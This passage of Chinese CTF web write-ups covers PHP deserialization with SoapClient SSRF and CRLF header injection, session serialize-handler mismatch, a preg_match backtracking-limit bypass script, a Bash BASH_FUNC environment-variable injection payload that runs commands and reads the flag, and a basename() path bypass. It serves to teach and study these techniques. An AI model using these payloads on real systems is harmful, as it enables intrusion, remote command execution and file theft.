class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/*读文件名*/</span><br><span class="line">$target = &quot;http://127.0.0.1/flag.php?a=DirectoryIterator&amp;b=glob:///f*&quot;;</span><br><span class="line">/*读文件内容*/</span><br><span class="line">//$target = &quot;http://127.0.0.1/flag.php?a=SplFileObject&amp;b=php://filter/convert.base64-encode/resource=/f1111llllllaagg&quot;;</span><br><span class="line"> </span><br><span class="line">$attack = new SoapClient(null,array(</span><br><span class="line">    &#x27;location&#x27;=&gt;$target,</span><br><span class="line">    &#x27;uri&#x27;=&gt;&#x27;http://127.0.0.1&#x27;,</span><br><span class="line">    &#x27;user_agent&#x27;=&gt;&quot;test\r\nCookie: PHPSESSID=vidkft3g6sgv3vbbbd5qu9aitk&quot;));</span><br><span class="line">$payload = urlencode(serialize($attack));</span><br><span class="line">echo &#x27;&#x27;.$payload;</span><br><span class="line">//POST:</span><br><span class="line">//sess=O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A16%3A%22http%3A%2F%2F127.0.0.1%22%3Bs%3A8%3A%22location%22%3Bs%3A58%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%3Fa%3DDirectoryIterator%26b%3Dglob%3A%2F%2F%2Ff%2A%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A50%3A%22test%0D%0ACookie%3A+PHPSESSID%3Du1um0t3pnp8sg1sc8d25ueidpp%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</span><br></pre></td></tr></table></figure><p>流程就是在index.php中利用session反序列化漏洞上传构造好的sess，然后sess里面的反序列化首先是利用SoapClient来造成ssrf以localhost的身份请求flag.php的内容，并且在flag.php中</p><p>1.先是利用DirectoryIterator这个类来查找flag文件的文件名[已知文件在根目录]。</p><p>2.利用SplFileObject和filter伪协议来读取文件内容，也就是flag的内容。</p><p>现在的目标就是想办法调用SoapClient里面的__Call，所以我们考虑利用之前pop链里面的call_user_func来调用随便一个函数触发call。也就是说我们随便写一个a，然后传入我们的链子，把返回的seesionID写进去，访问index.php，就成功看到flag。</p><h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><h5 id="session-反序列化机制"><a href="#session-反序列化机制" class="headerlink" title="session 反序列化机制"></a><strong>session 反序列化机制</strong></h5><blockquote><p>在php.ini中存在session.serialize_handler配置，定义用来序列化&#x2F;反序列化的<strong>处理器</strong>名字，默认使用php。<br>php中的session中的内容是以文件的方式来存储的<br>存储方式由配置项session.save_handler确定，默认是以文件的方式存储。</p></blockquote><h5 id="机制"><a href="#机制" class="headerlink" title="机制"></a>机制</h5><p>在PHP中session有两种<strong>机制</strong>，分别为默认机制和由用户自定义session处理机制。</p><h6 id="默认机制"><a href="#默认机制" class="headerlink" title="默认机制"></a>默认机制</h6><p>在php.ini中有如下配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.save_handler = file</span><br></pre></td></tr></table></figure><p>即，是用磁盘文件来实现PHP会话，它有以下几部分组成：</p><p><strong>session_start()</strong></p><p>session_start()是<strong>session机制的开始</strong>，它具有一定概率开启垃圾回收。这个概率是根据php.ini的配置决定的，因为在有的系统中session.gc_probability &#x3D; 0,即概率是0，这时就不具备垃圾回收</p><p><strong>为$_session赋值</strong></p><p>添加一个新值只会维持在<strong>内存</strong>中，当脚本执行结束的时候，把$_session的值写入到session_id指定的<strong>文件夹</strong>中，然后关闭相关资源。这个阶段有可能执行更改session_id的操作，比如销毁一个旧的session_id，生成一个全新的session_id。这一般用在自定义session操作</p><p><strong>写入session操作</strong></p><p>在脚本结束的时候会执行<strong>session写入操作</strong>，把$_session中的值写入到session_id命名的文件中，可能已经存在，可能需要创建新的文件。</p><p><strong>销毁session</strong></p><p>session发出去的cookie一般是<strong>即时cookie</strong>，保存在内存中，当浏览器关闭后，才会过期，但是如果只是想退出登录，而不是关闭浏览器，那么就需要在代码里销毁session，方法有很多。</p><ul><li>setcookies(session_name(),session_id(),time()-8000000,..) <strong>退出登录前执行</strong></li><li>usset($_SESSION); &#x2F;&#x2F;删除所有的$_SEESION数据，刷新后，有cookie传过来但是没有数据</li><li>session_destroy(); &#x2F;&#x2F;这个作用更彻底，删除$_SESSION 删除session文件 和session_id</li></ul><h6 id="用户自定义session处理机制"><a href="#用户自定义session处理机制" class="headerlink" title="用户自定义session处理机制"></a>用户自定义session处理机制</h6><p>在php.ini中有如下配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.save_handler = user</span><br></pre></td></tr></table></figure><p><strong>session_start()</strong></p><p>执行open($save_path,$session_name)语句打开session操作句柄执行read($id)从中读取数据</p><p><strong>注意</strong>：$save_path在此情况下直接返回true</p><p><strong>脚本执行结束</strong></p><p>执行write($id,$sess_data)语句</p><p><strong>销毁session</strong></p><p>需要注意如果用户需要销毁session则要先执行destroy再执行第2步</p><h5 id="引擎"><a href="#引擎" class="headerlink" title="引擎"></a>引擎</h5><p><code>session.serialize_handler</code>是用来设置session的序列话<strong>引擎</strong>的，除了默认的PHP引擎之外，还存在其他引擎，不同的引擎所对应的session的存储方式不相同。</p><ul><li><strong>php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</strong></li><li><strong>php:存储方式是，键名+竖线+经过serialize()函数序列处理的值</strong></li><li><strong>php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值</strong></li></ul><p>在PHP中默认使用的是PHP引擎，如果要修改为其他的引擎，只需要添加代码<code>ini_set(&#39;session.serialize_handler&#39;, &#39;需要设置的引擎&#39;);</code></p><blockquote><p>PHP中session本身的序列化<strong>机制</strong>是没有问题的<br>问题出在了如果在序列化和反序列化时选择的<strong>引擎不同</strong>，就会带来安全问题<br>当使用php引擎的时候，php引擎会以作为作为key和value的分隔符，对value多进行一次反序列化，达到我们触发反序列化的目的</p></blockquote><h5 id="漏洞实例"><a href="#漏洞实例" class="headerlink" title="漏洞实例"></a>漏洞实例</h5><p>存在s1.php和us2.php,两个文件所使用的的session引擎不一样，就形成了一个漏洞。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//s1.php中，使用php_serilise来处理session。</span><br><span class="line">//php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值</span><br><span class="line">&lt;?php</span><br><span class="line">    ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);</span><br><span class="line">    session_start();</span><br><span class="line">    $_SESSION[&quot;spoock&quot;]=$_GET[&quot;a&quot;];</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">//us2.php中，用php来处理session</span><br><span class="line">//php:存储方式是，键名+竖线+经过serialize()函数序列处理的值</span><br><span class="line">&lt;?php</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">classlemon&#123;</span><br><span class="line">    var$hi;</span><br><span class="line">    function__construct()&#123;</span><br><span class="line">            $this-&gt;hi=&#x27;phpinfo();&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function__destruct()&#123;</span><br><span class="line">        eval($this-&gt;hi);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在我们访问s1,php时，构造如下payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">locallhost/s1.php?a=O:5:&quot;lemon&quot;:1:&#123;s:2:&quot;hi&quot;;s:14:&quot;echo &quot;spoock&quot;;&quot;;&#125;</span><br></pre></td></tr></table></figure><p>传进去的 a 在s1.php中进行序列化，引擎是php_serialize，</p><p>所以最后存储的内容是：</p><p><code>a:1:&#123;s:6:&quot;spoock&quot;;s:48:&quot;O:5:&quot;lemon&quot;:1:&#123;s:2:&quot;hi&quot;;s:14:&quot;echo &quot;spoock&quot;;&quot;;&#125;&quot; &#125;</code></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221201175904124-1-1024x227.png"></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221201175845894-1-1024x91.png"></p><p>然而，在us2.php中，我们读取数据却选择的php，此时读取的内容就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [a:1:&#123;s:6:&quot;spoock&quot;;s:48:&quot;] =&gt; __PHP_Incomplete_Class Object</span><br><span class="line">        (</span><br><span class="line">            [__PHP_Incomplete_Class_Name] =&gt; lemon</span><br><span class="line">            [hi] =&gt; echo &quot;spoock&quot;;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [spoock] =&gt; O:5:&quot;lemon&quot;:1:&#123;s:2:&quot;hi&quot;;s:14:&quot;echo &quot;spoock&quot;;&quot;;&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>因为我们使用PHP引擎的时候，PHP引擎会用 作为 key 和 value 的分隔符，就会将<code> `a:1:&#123;s:6:&quot;spoock&quot;;s:48:&quot;</code>作为session的key，将<code>O:5:&quot;lemon&quot;:1:&#123;s:2:&quot;hi&quot;;s:14:&quot;echo &quot;spoock&quot;;&quot;;&#125;&quot; &#125;</code>作为value，进行反序列化的时候就会得到lemon这个类。</p><p>那么我们访问us2.php的时候，就会执行我们写入的echo spock这个操作。</p><h5 id="PHP原生类的利用"><a href="#PHP原生类的利用" class="headerlink" title="PHP原生类的利用"></a>PHP原生类的利用</h5><blockquote><p>引言：文章围绕着一个问题，如果在代码审计中有反序列化点，但是在原本的代码中找不到pop链该如何?</p></blockquote><p>参考：<a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label1_0">反序列化之PHP原生类的利用</a></p><p><strong>SoapClient</strong></p><p>这个也算是目前被挖掘出来最好用的一个内置类，php5、7都存在此类。这个内置类里面也有一些自带的魔术方法，比如，__call.可以反序列化这个内置类然后通过一些方法来调用魔法函数来达到目的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = new SoapClient(null,array(&#x27;uri&#x27;=&gt;&#x27;http://example.com:5555&#x27;, &#x27;location&#x27;=&gt;&#x27;http://example.com:5555/aaa&#x27;));</span><br><span class="line">$b = serialize($a);</span><br><span class="line">echo $b;</span><br><span class="line">$c = unserialize($b);</span><br><span class="line">$c-&gt;not_exists_function();</span><br><span class="line">             //调用了c里面不存在的函数a，跳进c也就是SoapClient里面的__call()</span><br><span class="line">             //发现SOAPAction参数可控，可以在SOAPAction处注入恶意的换行</span><br><span class="line">             //这样一来我们POST提交的header就是可控的，我们就可以通过注入来执行我们想要执行的操作了。(CRLF)</span><br></pre></td></tr></table></figure><h5 id="CRLF攻击"><a href="#CRLF攻击" class="headerlink" title="CRLF攻击"></a>CRLF攻击</h5><p>什么是<strong>CRLF</strong>，其实就是回车和换行造成的漏洞，十六进制为<code>0x0d,0x0a</code> ，在HTTP当中<code>header</code>和<code>body</code>之间就是两个CRLF分割的，所以如果我们能够控制HTTP消息头中的字符，注入一些恶意的换行，这样就能注入一些会话cookie和html代码，所以crlf injection 又叫做 HTTP Response Splitting。</p><p>其实就是利用http请求的固定格式要求来植入恶意代码。</p><p>soap：简单对象访问协议； -》底层通讯逻辑为http</p><p>因此可以通过<strong>控制soapaction的参数</strong>，在SOAPAction处注入恶意的<strong>换行</strong>，这样一来我们POST提交的header就是可控的，我们就可以通过注入来执行我们想要执行的操作了。</p><hr><h2 id="Babyweb-2023安洵杯春季赛"><a href="#Babyweb-2023安洵杯春季赛" class="headerlink" title="Babyweb(2023安洵杯春季赛)"></a>Babyweb(2023安洵杯春季赛)</h2><p>两个PHP</p><h3 id="PHP1-0"><a href="#PHP1-0" class="headerlink" title="PHP1.0"></a>PHP1.0</h3><h5 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h5><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230308203346357.png"></p><h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><p>需要post一个heizi，作为变量a</p><p>a的前五项是aikun</p><p>a的最后十项是xiaojijiao</p><p>中间加东西</p><p>目标是绕过：<code>preg_match(&#39;/aikun+?xiaojijiao/is&#39;,$a)</code>,不能让这个条件满足，但是实际上传的a又必须是这个形式的。就有一个知识点：grep_match回溯次数绕过</p><p><a href="https://blog.csdn.net/yourdawntown/article/details/120558237">正则回溯次数绕过</a></p><p><a href="https://www.cnblogs.com/20175211lyz/p/12198258.html">preg_match绕过总结</a></p><p>.+?是惰性匹配，正则匹配会尽可能少的去匹配。回溯匹配指先对目标字符串顺序匹配，匹配到目标之后再倒回去看上一个匹配的。</p><p>最新的PHP文档里规定了正则匹配最大回溯次数是一百万也就是1000000，超过这个值就不再回溯。</p><p>对于本题如果中间有1000000个其他字符，则匹配到最后一个时开始回溯，回溯到第一百万停止回溯，此时还没回溯到应该匹配的哪一个字符，函数返回匹配失败，成功绕过。</p><h5 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> #!/usr/bin/env python</span><br><span class="line"> # -*- coding:utf-8 -*-</span><br><span class="line"> # auther:psych</span><br><span class="line"> # time:2023/3/1</span><br><span class="line"> ​</span><br><span class="line"> import requests</span><br><span class="line"> import re</span><br><span class="line"> url = &#x27;http://182.148.156.200:9134/&#x27;</span><br><span class="line"> a = requests.Session()</span><br><span class="line"> payload = &#123;&#x27;heizi&#x27;: &quot;aikun&quot; + &quot;a&quot;*1000000 + &quot;xiaojijiao&quot;&#125;      //注意回溯上限是一百万</span><br><span class="line"> print(a.post(url, payload).text)</span><br></pre></td></tr></table></figure><h3 id="PHP2-0"><a href="#PHP2-0" class="headerlink" title="PHP2.0"></a>PHP2.0</h3><p>找不到源码了，具体的关键的代码就一句，类似下面这个：</p><h5 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"> foreach($_REQUEST[&#x27;envs&#x27;] as $key =&gt; $val) &#123;</span><br><span class="line">     putenv(&quot;&#123;$key&#125;=&#123;$val&#125;&quot;);</span><br><span class="line"> &#125;</span><br><span class="line"> //... 一些其他代码</span><br><span class="line"> system(&#x27;echo hello&#x27;);</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure><p>有两个可疑点：</p><blockquote><ul><li>envs,环境变量应该是其中一个突破口</li><li>一个echo函数本来可以直接写，结果非要套一个system。。肯定有问题</li></ul></blockquote><p>首先是关于环境变量的一些思考。</p><h5 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h5><p><a href="https://blog.csdn.net/Jeff_12138/article/details/124815448">LD_PRELOAD环境变量注入</a></p><blockquote><p>LD_PRELOAD是Linux系统的一个<strong>环境变量</strong>，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。</p></blockquote><blockquote><p>用人话讲，LD_PRELOAD，是个环境变量，用于动态库的加载，而动态库加载的优先级最高，因此我们可以<strong>抢先在正常函数执行之前率先执行我们的用代码写的函数</strong>。</p></blockquote><p>因此我们能利用LD_PRELOAD劫持并<strong>执行任意代码</strong>。但遗憾的是，这里没有上传点，我们压根就不可能整个LD_PRELOAD&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;hj.jpg上去。这就是如今的问题所在，怎么在<strong>没有给上传接口</strong>的情况下get shell。</p><h5 id="环境变量注入"><a href="#环境变量注入" class="headerlink" title="环境变量注入"></a>环境变量注入</h5><p><a href="https://www.ctfiot.com/26843.html">https://www.ctfiot.com/26843.html</a></p><p>在大佬的博客中看了半天没看懂，只能说羡慕Linux内核玩家。最后抄个结论：</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230309075600961.png"></p><p><a href="https://www.cnblogs.com/ziyunfei/p/4828767.html">bash从环境变量中导入函数</a></p><p>省流：</p><ul><li>Bash 把满足 “BASH_FUNC_函数名%%＝(){ 函数体}格式的环境变量作为函数源码解析并导入</li><li>然而，本文所讲的表现仅适用于 Bash 4.3.30 及之后的版本，之前的 Bash 版本在导出函数时不会给函数名加上 BASH_FUNC_ 前缀和 %% 后缀，在导入时也不会识别前缀后缀，只要看到 ＝ 右边是 “() {“ 这四个字符，就按函数导入</li></ul><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230309085711588-1024x196.png"></p><p>而这个题还没有那么简单，</p><blockquote><p>只不过和4.4以下的有一处差异：**Bash 4.4下FUNCDEF_SUFFIX等于%%，而这个4.2的补丁中FUNCDEF_SUFFIX等于()**。</p></blockquote><p>也就是说上面大佬的payload还要更改为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> env=[BASH_FUNC_echo()]() &#123; id; &#125;</span><br></pre></td></tr></table></figure><p>最后执行了id，现在的问题是执行找到flag并输出。</p><p>原题目还加上了一些黑名单，cat和flag都被限制，就用字符串拼接绕过，因为内部是PHP代码，PHP字符串可以拼接。</p><h5 id="最终payload"><a href="#最终payload" class="headerlink" title="最终payload"></a>最终payload</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> env[BASH_FUNC_echo()]=()%20&#123;%20c=ca;d=t;a=fl;b=ag;$c$d%20/$a$b;%20&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>强网拟态-2022-web-部分wp(未完待续)</title>
      <link href="/2023/07/01/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-2022-web-%E9%83%A8%E5%88%86wp%E6%9C%AA%E5%AE%8C%E5%BE%85%E7%BB%AD/"/>
      <url>/2023/07/01/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-2022-web-%E9%83%A8%E5%88%86wp%E6%9C%AA%E5%AE%8C%E5%BE%85%E7%BB%AD/</url>
      
        <content type="html"><![CDATA[<h1 id="ezus"><a href="#ezus" class="headerlink" title="ezus"></a>ezus</h1><hr><h2 id="题目内容"><a href="#题目内容" class="headerlink" title="题目内容"></a>题目内容</h2><h3 id="index-php-点进去是源码"><a href="#index-php-点进去是源码" class="headerlink" title="index.php 点进去是源码"></a>index.php 点进去是源码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"> include &#x27;tm.php&#x27;; // Next step in tm.php </span><br><span class="line"> if (preg_match(&#x27;/tm\.php\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;]))</span><br><span class="line"> &#123;</span><br><span class="line">     exit(&quot;no way!&quot;);</span><br><span class="line"> &#125;</span><br><span class="line"> if (isset($_GET[&#x27;source&#x27;]))</span><br><span class="line"> &#123;</span><br><span class="line">     $path = basename($_SERVER[&#x27;PHP_SELF&#x27;]);</span><br><span class="line">     if (!preg_match(&#x27;/tm.php$/&#x27;, $path) &amp;&amp; !preg_match(&#x27;/index.php$/&#x27;, $path))</span><br><span class="line">     &#123;</span><br><span class="line">         exit(&quot;nonono!&quot;);</span><br><span class="line">     &#125;</span><br><span class="line">     highlight_file($path);</span><br><span class="line">     exit();</span><br><span class="line"> &#125;</span><br><span class="line"> ?&gt;</span><br><span class="line"> &lt;a href=&quot;index.php?source&quot;&gt;Source&lt;/a&gt;</span><br></pre></td></tr></table></figure><h3 id="tm-php-反序列化"><a href="#tm-php-反序列化" class="headerlink" title="tm.php 反序列化"></a>tm.php 反序列化</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"> class UserAccount</span><br><span class="line"> &#123;</span><br><span class="line">     protected $username;</span><br><span class="line">     protected $password;</span><br><span class="line"> ​</span><br><span class="line">     public function __construct($username, $password)</span><br><span class="line">     &#123;</span><br><span class="line">         $this-&gt;username = $username;</span><br><span class="line">         $this-&gt;password = $password;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> ​</span><br><span class="line"> function object_sleep($str)</span><br><span class="line"> &#123;</span><br><span class="line">     $ob = str_replace(chr(0).&#x27;*&#x27;.chr(0), &#x27;@0@0@0@&#x27;, $str);</span><br><span class="line">     return $ob;</span><br><span class="line"> &#125;</span><br><span class="line"> ​</span><br><span class="line"> function object_weakup($ob)</span><br><span class="line"> &#123;</span><br><span class="line">     $r = str_replace(&#x27;@0@0@0@&#x27;, chr(0).&#x27;*&#x27;.chr(0), $ob);</span><br><span class="line">     return $r;</span><br><span class="line"> &#125;</span><br><span class="line"> ​</span><br><span class="line"> class order</span><br><span class="line"> &#123;</span><br><span class="line">     public $f;</span><br><span class="line">     public $hint;</span><br><span class="line"> ​</span><br><span class="line">     public function __construct($hint, $f)</span><br><span class="line">     &#123;</span><br><span class="line">         $this-&gt;f = $f;</span><br><span class="line">         $this-&gt;hint = $hint;</span><br><span class="line">     &#125;</span><br><span class="line"> ​</span><br><span class="line">     public function __wakeup()</span><br><span class="line">     &#123;</span><br><span class="line">         //something in hint.php</span><br><span class="line">         if ($this-&gt;hint != &quot;pass&quot;  $this-&gt;f != &quot;pass&quot;) &#123;</span><br><span class="line">             $this-&gt;hint = &quot;pass&quot;;</span><br><span class="line">             $this-&gt;f = &quot;pass&quot;;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> ​</span><br><span class="line">     public function __destruct()</span><br><span class="line">     &#123;</span><br><span class="line">         if (filter_var($this-&gt;hint, FILTER_VALIDATE_URL))</span><br><span class="line">         &#123;</span><br><span class="line">             $r = parse_url($this-&gt;hint);</span><br><span class="line">             if (!empty($this-&gt;f)) &#123;</span><br><span class="line">                 if (strpos($this-&gt;f, &quot;try&quot;) !==  false &amp;&amp; strpos($this-&gt;f, &quot;pass&quot;) !== false) &#123;</span><br><span class="line">                     @include($this-&gt;f . &#x27;.php&#x27;);</span><br><span class="line">                 &#125; else &#123;</span><br><span class="line">                     die(&quot;try again!&quot;);</span><br><span class="line">                 &#125;</span><br><span class="line">                 if (preg_match(&#x27;/prankhub$/&#x27;, $r[&#x27;host&#x27;])) &#123;</span><br><span class="line">                     @$out = file_get_contents($this-&gt;hint);</span><br><span class="line">                     echo &quot;&lt;br/&gt;&quot;.$out;</span><br><span class="line">                 &#125; else &#123;</span><br><span class="line">                     die(&quot;&lt;br/&gt;error&quot;);</span><br><span class="line">                 &#125;</span><br><span class="line">             &#125; else &#123;</span><br><span class="line">                 die(&quot;try it!&quot;);</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">         else</span><br><span class="line">         &#123;</span><br><span class="line">             echo &quot;Invalid URL&quot;;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> ​</span><br><span class="line"> $username = $_POST[&#x27;username&#x27;];</span><br><span class="line"> $password = $_POST[&#x27;password&#x27;];</span><br><span class="line"> ​</span><br><span class="line"> $user = serialize(new UserAccount($username, $password));</span><br><span class="line"> unserialize(object_weakup(object_sleep($user)))</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h3><ul><li>题目暗示我们访问 &#x2F;tm.php</li><li>第一个if，百度发现<code>$_SERVER[&#39;PHP_SELF&#39;] 获取当前页面地址</code> 也就是地址不能以tm.php结尾，就是我们不能直接访问&#x2F;tm.php</li><li>下面就是判断路径最后一个文件名是不是tm.php，如果是就返回no way,说明不能直接访问</li><li>出现了一个<code>source</code> 变量， 里面的关键是<code>highlight_file($path);</code> 中间if没啥用，也就是说目的只是让<code>path=tm.php</code></li><li>网上wp说：<code>basename()</code>在<code>Linux</code>下，如果取得的文件名开头是非ASCII码范围的字符，则<code>basename()</code>会抛弃这个文件名，继续往上一层走，把上一层的文件名取出来，直到获取到正常可显示ASCII字符开头的文件名(<code>Windows下直接获取</code>)。<ul><li>参考链接：<a href="https://www.cnblogs.com/yesec/p/15429527.html">basename()绕过总结</a>在使用默认语言环境设置时，basename() 会删除文件名开头的非 ASCII 字符。</li></ul></li><li>我们的目的是从<code>highlight_file($path);</code> 中把tm.php的源码搞到，就需要path是tm.php，并且要有<code>source</code></li><li>绕过wp：<code>//index.php/tm.php/%88?source=tm.php</code></li><li>这样正则匹配的时候返回的是<code>%88</code> 故可以染过正则匹配 ，但是<code>basename()</code>函数运行的时候忽略<code>%88</code>，直接匹配到<code>tm.php</code> ，只要有<code>source</code>就会进入if从而<code>highlight_file($path);</code></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td 